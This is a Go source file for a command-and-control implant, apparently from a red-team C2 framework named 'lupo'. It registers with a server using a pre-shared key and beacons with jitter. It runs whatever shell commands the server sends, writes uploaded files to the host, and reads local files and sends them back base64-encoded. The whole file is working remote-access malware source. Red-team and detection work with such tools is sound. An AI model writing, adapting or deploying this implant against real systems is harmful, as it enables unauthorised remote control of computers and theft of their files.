package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// Configuration
type lupoImplant struct {
	updateInterval int
	rhost          string
	rport          int
	sessionID      int
	uuid           string
	psk            string
	data           string
	filename       string
	file           string
	registered     bool
}

// Registration response from server
type RegistrationResponse struct {
	SessionID int    `json:"sessionID"`
	UUID      string `json:"UUID"`
}

// Check-in response from server
type CommandResponse struct {
	Cmd  string `json:"cmd"`
	User string `json:"user"`
}

// Client registration request
type RegistrationRequest struct {
	PSK         string  `json:"PSK"`
	SessionID   int     `json:"SessionID"`
	ImplantArch string  `json:"ImplantArch"`
	Update      float64 `json:"Update"`
	Register    bool    `json:"Register"`
}

// Client check-in request
type CheckInRequest struct {
	PSK         string  `json:"PSK"`
	SessionID   int     `json:"SessionID"`
	UUID        string  `json:"UUID"`
	Data        string  `json:"Data"`
	ImplantArch string  `json:"ImplantArch"`
	Update      float64 `json:"Update"`
	Register    bool    `json:"Register"`
	Filename    string  `json:"Filename,omitempty"`
	File        string  `json:"File,omitempty"`
}

var implant *lupoImplant

func main() {
	// Configuration
	updateInterval := 1
	jitterMin := 1
	jitterMax := 1

	// Initialize implant
	implant = &lupoImplant{
		updateInterval: updateInterval,
		rhost:          "127.0.0.1",
		rport:          9999,
		sessionID:      -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
		filename:       "",
		file:           "",
		registered:     false,
	}

	for {
		rand.Seed(time.Now().UnixNano())
		jitter := rand.Intn(jitterMax-jitterMin+1) + jitterMin
		implant.updateInterval = updateInterval + jitter

		// Execute check-in
		success := execLoop()

		if !success {
			// Connection failed, continue trying
		}

		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
	}
}

func execLoop() bool {
	arch := getArchitecture()

	if !implant.registered {
		// Registration phase
		regReq := RegistrationRequest{
			PSK:         implant.psk,
			SessionID:   0,
			ImplantArch: arch,
			Update:      float64(implant.updateInterval),
			Register:    true,
		}

		response, err := sendTCP(regReq)
		if err != nil {
			return false
		}

		var regResp RegistrationResponse
		err = json.Unmarshal([]byte(response), &regResp)
		if err != nil {
			return false
		}

		// Store credentials
		implant.sessionID = regResp.SessionID
		implant.uuid = regResp.UUID
		implant.registered = true

		return true
	}

	// Check-in phase
	checkinReq := CheckInRequest{
		PSK:         implant.psk,
		SessionID:   implant.sessionID,
		UUID:        implant.uuid,
		Data:        implant.data,
		ImplantArch: arch,
		Update:      float64(implant.updateInterval),
		Register:    false,
		Filename:    implant.filename,
		File:        implant.file,
	}

	response, err := sendTCP(checkinReq)
	if err != nil {
		// Network error - server might be down, retry later
		return false
	}

	// If response is empty, server might still be starting up
	if response == "" {
		return false
	}

	// Check if server is issuing new credentials (re-registration during check-in)
	// Registration responses have only sessionID and UUID fields
	// Command responses have cmd and user fields
	// We check the raw JSON to distinguish between them
	
	var regResp RegistrationResponse
	var cmdResp CommandResponse
	
	// First, check if response contains "cmd" field to determine response type
	hasCmd := strings.Contains(response, `"cmd"`)
	
	if !hasCmd {
		// This should be a registration response
		err = json.Unmarshal([]byte(response), &regResp)
		if err == nil && regResp.SessionID >= 0 && regResp.UUID != "" {
			// Server issued new credentials, update them
			implant.sessionID = regResp.SessionID
			implant.uuid = regResp.UUID
			// Clear old data when getting new credentials
			implant.data = ""
			implant.filename = ""
			implant.file = ""
			return true
		}
	}

	// Parse as command response
	err = json.Unmarshal([]byte(response), &cmdResp)
	if err != nil {
		// Malformed response - might indicate server issues, retry
		return false
	}

	// Successfully received command response, clear sent data and files
	implant.data = ""
	implant.filename = ""
	implant.file = ""

	// Handle command
	if cmdResp.Cmd != "" {
		executeCommand(cmdResp.Cmd)
	}

	return true
}

// sendTCP sends a JSON request to the C2 server and returns the response
func sendTCP(message interface{}) (string, error) {
	// Marshal request to JSON
	jsonData, err := json.Marshal(message)
	if err != nil {
		return "", err
	}

	// Create TCP connection
	conn, err := net.Dial("tcp", implant.rhost+":"+strconv.Itoa(implant.rport))
	if err != nil {
		return "", err
	}
	defer conn.Close()

	// Set read timeout
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))

	// Send request with newline terminator (CRITICAL for TCP protocol)
	_, err = conn.Write(append(jsonData, '\n'))
	if err != nil {
		return "", err
	}

	// Read response (server sends ONE JSON object WITHOUT newline)
	reader := bufio.NewReader(conn)
	var response strings.Builder
	braceCount := 0
	inResponse := false

	for {
		b, err := reader.ReadByte()
		if err != nil {
			break
		}

		response.WriteByte(b)

		// Track braces to detect complete JSON object
		if b == '{' {
			inResponse = true
			braceCount++
		} else if b == '}' {
			braceCount--
			// When we close the root brace, we have a complete JSON object
			if inResponse && braceCount == 0 {
				break
			}
		}
	}

	return response.String(), nil
}

// executeCommand executes a shell command and returns the output
func executeCommand(cmd string) {

	if cmd == "exit" {
		os.Exit(0)
	}

	// Parse command and arguments
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		implant.data = ""
		return
	}

	rootCmd := parts[0]
	var args []string
	if len(parts) > 1 {
		args = parts[1:]
	}

	// Handle special commands with arguments
	if rootCmd == "cd" && len(args) > 0 {
		err := os.Chdir(strings.Join(args, " "))
		if err != nil {
			implant.data = err.Error()
		} else {
			implant.data = ""
		}
		return
	}

	if rootCmd == "upload" && len(args) > 0 {
		filename := args[0]
		// args[1:] contains the base64-encoded file content
		fileb64 := strings.Join(args[1:], " ")

		filecontent, err := base64.StdEncoding.DecodeString(fileb64)
		if err != nil {
			implant.data = err.Error()
			return
		}

		f, err := os.Create(filename)
		if err != nil {
			implant.data = err.Error()
			return
		}
		defer f.Close()

		if _, err := f.Write(filecontent); err != nil {
			implant.data = err.Error()
			return
		}

		if err := f.Sync(); err != nil {
			implant.data = err.Error()
			return
		}

		implant.data = "File uploaded: " + filename
		return
	}

	if rootCmd == "download" && len(args) > 0 {
		filename := args[0]

		content, err := ioutil.ReadFile(filename)
		if err != nil {
			implant.data = err.Error()
			return
		}

		// Encode file as base64
		encoded := base64.StdEncoding.EncodeToString(content)

		implant.filename = filename
		implant.file = encoded
		implant.data = ""
		return
	}

	if rootCmd == "updateinterval" && len(args) > 0 {
		newInterval, err := strconv.Atoi(args[0])
		if err != nil {
			implant.data = err.Error()
			return
		}
		implant.updateInterval = newInterval
		implant.data = "Implant interval updated to: " + strconv.Itoa(implant.updateInterval)
		return
	}

	// Execute regular shell command
	var execCmd *exec.Cmd
	if len(args) > 0 {
		execCmd = exec.Command(rootCmd, args...)
	} else {
		execCmd = exec.Command(rootCmd)
	}

	output, err := execCmd.CombinedOutput()
	if err != nil {
		implant.data = err.Error()
		return
	}

	// Strip trailing whitespace - let JSON marshaler handle escaping
	outputStr := strings.TrimSpace(string(output))
	implant.data = outputStr
}

// getArchitecture returns the architecture string
func getArchitecture() string {
	return runtime.GOOS + "/" + runtime.GOARCH
}


